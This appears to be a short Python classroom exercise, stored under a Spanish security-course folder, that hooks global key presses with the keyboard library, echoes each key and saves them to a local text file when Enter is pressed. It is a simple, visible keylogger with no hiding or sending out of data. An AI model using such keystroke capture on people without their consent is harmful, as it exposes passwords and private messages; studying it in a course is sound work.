import keyboard

teclas = []

def registrar(tecla):

    if tecla == "space": tecla = " "

    elif tecla == "enter": tecla = "[ENTER]"
    
    elif len(tecla) > 1: tecla = f"[{tecla}]"
    
    teclas.append(tecla)
    print(f"Tecla {len(teclas)}: {tecla}")

keyboard.on_press(lambda e: registrar(e.name))
keyboard.wait('enter')

with open(r"E:\Clases\Seguridad\Keylogger\registro.txt", "w") as f:
    f.write("".join(teclas))

print("Registro completo:", "".join(teclas))